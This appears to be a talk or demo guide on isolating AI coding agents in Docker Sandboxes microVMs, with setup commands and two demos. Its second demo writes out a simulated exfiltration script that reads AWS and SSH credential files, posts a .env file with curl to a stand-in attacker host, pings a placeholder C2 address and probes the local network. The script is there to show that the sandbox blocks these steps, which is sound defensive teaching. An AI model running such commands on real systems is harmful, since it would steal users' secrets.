# Secure AI Coding Agents with Docker Sandboxes

> By Sagar Utekar — Docker Captain | Senior SRE, CrowdStrike | CNCF Ambassador

---

## Why This Matters

- 25% of production code is now AI-authored
- Developers using agents merge 60% more PRs
- Agents run with YOUR credentials, filesystem, and network access
- Your laptop is the new prod — with zero security boundaries

![The problem — agents need permissions to work](images/claude-code-permissions.png)

**This isn't hypothetical.** NVIDIA's AI red team published CVE-2024-12366 — a documented case of AI-generated code escalating into remote code execution when there's no proper isolation. Two security tools (Trivy, KICS) were supply-chain-compromised in Q1 2026 via stolen credentials.

The tradeoff AI agents have imposed: limit access and the agent becomes not-so-autonomous. Give full access and it's a security nightmare. Docker Sandboxes breaks that compromise — full autonomy inside hard boundaries.

---

## What Are Docker Sandboxes?

Give your AI agent its own **burner laptop**. It can install whatever it wants, spin up containers, do damage inside — your actual machine stays completely untouched.

Each sandbox is an isolated microVM with its own kernel, Docker daemon, filesystem, and network stack. On Mac, that's Apple's Virtualization Framework. On Windows, Hyper-V. Actual hypervisor-level isolation.

**You don't need Docker Desktop.** The `sbx` CLI is standalone.

![Sandbox Security Architecture — hypervisor boundary between sandbox VM and host](images/sandbox-architecture.png)

### How they work

`sbx run claude` →
1. Boots a microVM with a dedicated kernel
2. Mounts only your project workspace (read-write)
3. Starts an isolated Docker daemon inside
4. Routes all network through a policy-enforcing proxy
5. Injects credentials at proxy level — never visible inside the sandbox
6. Launches agent in full autonomous mode (no permission prompts)

### Four layers of isolation

| Layer | What it does |
|-------|-------------|
| VM isolation | Separate kernel — can't touch yours |
| Private Docker | Agent builds/runs containers with zero visibility into host Docker |
| Network isolation | Can't reach localhost or other sandboxes; outbound goes through filtering proxy |
| Filesystem isolation | Only workspace syncs; ~/.ssh, ~/.aws, other projects invisible |

### Why not containers?

Docker started with containers for this but moved away:

- **Shared kernel** — kernel exploit inside container hits your host OS
- **Docker-in-Docker problem** — agents need Docker access. Options: privileged mode (tears down isolation) or mount host socket (gives full access to everything). Both bad.

MicroVMs solve both: dedicated kernel + private Docker daemon.

---

## Setup

```bash
# Install (macOS)
brew install docker/tap/sbx

# Install (Windows — enable HypervisorPlatform first)
winget install -h Docker.sbx

# Install (Linux)
sudo apt-get install docker-sbx
sudo usermod -aG kvm $USER && newgrp kvm

# Login
sbx login

# Store API key (saved in OS keychain, never in sandbox)
sbx secret set ANTHROPIC_API_KEY
```

First login prompts for a network policy: **Open** | **Balanced** (recommended) | **Locked Down**

---

## Running Agents

```bash
cd ~/projects/my-app
sbx run claude          # Claude Code
sbx run codex           # OpenAI Codex
sbx run copilot         # GitHub Copilot
sbx run gemini          # Gemini CLI
sbx run kiro            # Kiro
sbx run shell           # Plain shell (for demos)
```

Agent starts in YOLO mode — no permission prompts. It can only see `/workspace/`.

![sbx TUI dashboard — status, network requests, memory usage](images/sbx-dashboard.png)

### Key commands

| Command | What it does |
|---------|-------------|
| `sbx` | TUI dashboard (status, network, firewall) |
| `sbx ls` | List sandboxes |
| `sbx exec <name> -- bash` | Shell into running sandbox |
| `sbx stop <name>` | Pause |
| `sbx rm <name>` | Destroy |
| `sbx policy ls` | View network rules |
| `sbx policy log` | Audit: allowed + blocked requests |
| `sbx policy allow network -g <domain>` | Allowlist a domain |
| `sbx ports publish <name> 3000` | Forward port to host |
| `sbx run claude --branch feature-x` | Git worktree isolation |
| `sbx secret set <KEY>` | Store credential |
| `sbx save` | Snapshot as template |

---

## The Workflow

1. `sbx run claude` — agent starts in isolated microVM
2. Turn it loose on any task — it works autonomously
3. Changes sync to your real project directory (bidirectional, paths preserved)
4. `sbx policy log` — see everything it did
5. `sbx rm` — sandbox gone, code stays

The sandbox is invisible to `docker ps`. It's a separate management plane.

---

## Demo 1: Agent Does Real Work — Safely

**What you're showing:** An agent installs packages, modifies files, runs a server — all inside a sandbox. Your host stays untouched. Then you prove isolation by showing what the agent CAN'T see.

### Pre-demo setup

```bash
# Create a demo project (or use any existing Node/Python project)
mkdir ~/demo-app && cd ~/demo-app
git init
npm init -y
cat > server.js << 'EOF'
const express = require('express');
const app = express();
app.get('/', (req, res) => res.json({ status: 'running' }));
app.listen(3000, () => console.log('Server on :3000'));
EOF

# Add a fake .env to show credential isolation
cat > .env << 'EOF'
DATABASE_URL=postgresql://admin:supersecret@prod-db.internal:5432/main
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_KEY=sk_live_1234567890abcdef
EOF

git add -A && git commit -m "initial"
```

### Flow

**Step 1 — Launch the sandbox**

```bash
sbx run claude
```

> *Note: First run pulls the image (~1 min). After that it's seconds.*
> Point out: agent boots in YOLO mode — no permission prompts. It says "full autonomous mode."

**Step 2 — Give the agent a real task**

```
> Add express, a health check endpoint at /health, and rate limiting using express-rate-limit. Install dependencies, wire it up, and start the server to verify it works.
```

> *Note: The agent will `npm install`, create/modify files, and run `node server.js`. Let it work uninterrupted — that's the point. No babysitting.*

**Step 3 — While agent works, open a second terminal and prove isolation**

```bash
# Your host: agent's sandbox is invisible to Docker
docker ps
# → Nothing. Sandbox doesn't show here.

# List sandboxes (separate management plane)
sbx ls
# → claude-demo-app   RUNNING

# Check what the agent can see vs your host
# On your HOST:
ls ~/.aws ~/.ssh ~/.docker 2>/dev/null
# → Your credentials, SSH keys, Docker config — all here

# Now shell INTO the sandbox:
sbx exec claude-demo-app -- bash -c "ls ~/.aws ~/.ssh ~/.docker 2>&1"
# → "No such file or directory" for ALL of them
```

> *Note: This is the money shot. Side-by-side — host has everything, sandbox has nothing except the project.*

**Step 4 — Check network audit**

```bash
sbx policy log
```

> *Note: Show the allowed list (npm registry, anthropic API) and point out there are NO denied requests because the agent only did legitimate things. Clean bill of health.*

**Step 5 — Forward port and show the running app**

```bash
sbx ports publish claude-demo-app 3000
# Open http://localhost:3000/health in browser
```

> *Note: App runs inside the sandbox but you can view it from your host by forwarding the port. Agent can start servers, you selectively expose what you need.*

**Step 6 — Cleanup**

```bash
sbx rm claude-demo-app
# Sandbox gone. Code stays in your project directory.
```

---

## Demo 2: Attack Simulation — What Gets Blocked

**What you're showing:** A malicious script tries to exfiltrate data and scan your network. On a bare host it succeeds. In the sandbox it's blocked at every layer. The audit log catches everything.

### Pre-demo setup

```bash
# Create a "malicious" script in your demo project
cat > exfil.sh << 'EOF'
#!/bin/bash
echo "=== SIMULATED ATTACK ==="

echo "[1] Reading host credentials..."
cat ~/.aws/credentials 2>&1
cat ~/.ssh/id_rsa 2>&1

echo "[2] Exfiltrating .env to external server..."
curl -s -X POST https://evil-server.attacker.com/collect \
  -d "$(cat .env)" 2>&1

echo "[3] Pinging C2 server..."
ping -c 3 198.51.100.1 2>&1

echo "[4] Scanning internal network..."
curl -s http://192.168.1.1:8080 2>&1

echo "=== ATTACK COMPLETE ==="
EOF
chmod +x exfil.sh
```

### Flow

**Step 1 — Show what happens on a bare host (DON'T actually run — just explain)**

> *Note: "If an agent ran this on your bare machine, here's what would happen: it reads your AWS keys, curls them to an external server, pings a C2 IP, and scans your internal network. No alerts. No logs. Nothing stops it."*

**Step 2 — Launch a shell sandbox and run the attack**

```bash
sbx run shell
```

Inside the sandbox:

```bash
./exfil.sh
```

Expected output:

```
=== SIMULATED ATTACK ===
[1] Reading host credentials...
cat: /root/.aws/credentials: No such file or directory
cat: /root/.ssh/id_rsa: No such file or directory
[2] Exfiltrating .env to external server...
curl: (6) Could not resolve host: evil-server.attacker.com
[3] Pinging C2 server...
bash: ping: command not found
[4] Scanning internal network...
curl: (7) Failed to connect to 192.168.1.1 port 8080
=== ATTACK COMPLETE ===
```

> *Note: Walk through each failure:*
> - *"Credentials? Not mounted. Agent can't see them."*
> - *"Exfiltration? Domain blocked by network policy."*
> - *"C2 ping? Tool not even available, and network would block it anyway."*
> - *"Internal network scan? Can't reach your LAN."*

**Step 3 — Show the audit log (from host terminal)**

```bash
sbx policy log
```

> *Note: "Every blocked attempt is logged with timestamp, destination, and count. Your security team can see exactly what the agent tried. This is the Clarity in the 3Cs."*

**Step 4 — Install ping and try again (show layered defense)**

Inside the sandbox:

```bash
apt-get install -y iputils-ping
ping -c 3 198.51.100.1
# → Network is unreachable
```

> *Note: "Even after installing the tool (which is allowed — package managers are on the allowlist), the network policy still blocks the actual connection. Two independent layers."*

**Step 5 — Check audit log again**

```bash
sbx policy log
# → Now shows: 3 blocked attempts to 198.51.100.1
# → Count matches -c 3 from the ping command exactly
```

> *Note: "The audit log even captures the count — 3 attempts, matching exactly what the script tried. Full forensics."*

**Step 6 — Cleanup**

```bash
sbx rm <sandbox-name>
```

> *Note: "Sandbox destroyed. Host was never at risk. That's the whole point."*

---

## Takeaway: The 3Cs

| C | Principle | How |
|---|-----------|-----|
| **Contain** | Limit what agents reach | `sbx run` (microVM) |
| **Control** | Govern what agents do | Network + MCP policies |
| **Clarity** | See what agents did | `sbx policy log` |

---

*Sagar Utekar — Docker Captain | Senior SRE, CrowdStrike | CNCF Ambassador | @SagarUtekar*
